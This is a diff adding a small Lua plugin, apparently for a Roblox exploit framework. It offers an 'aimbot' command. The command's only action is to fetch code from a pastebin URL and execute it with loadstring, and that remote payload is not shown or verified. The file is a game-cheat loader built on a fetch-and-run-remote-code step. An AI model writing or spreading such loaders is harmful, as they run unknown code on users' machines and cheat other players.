@@ -1,0 +1,16 @@
+local Plugin = {
+	["PluginName"] = "Physic gun v2",
+	["PluginDescription"] = "gives you an aimlock gui",
+	["Commands"] = {
+		["pgun/physicgun"] = {
+			["Description"] = "aimbot, an aimbot",
+			["Aliases"] = {'aim','aimbot'},
+			["Function"] = function(args,speaker)
+				loadstring(game:httpget("https://pastebin.com/raw/5JmMeENX",true))()
+
+			end,
+		},
+	},
+}
+
+return Plugin
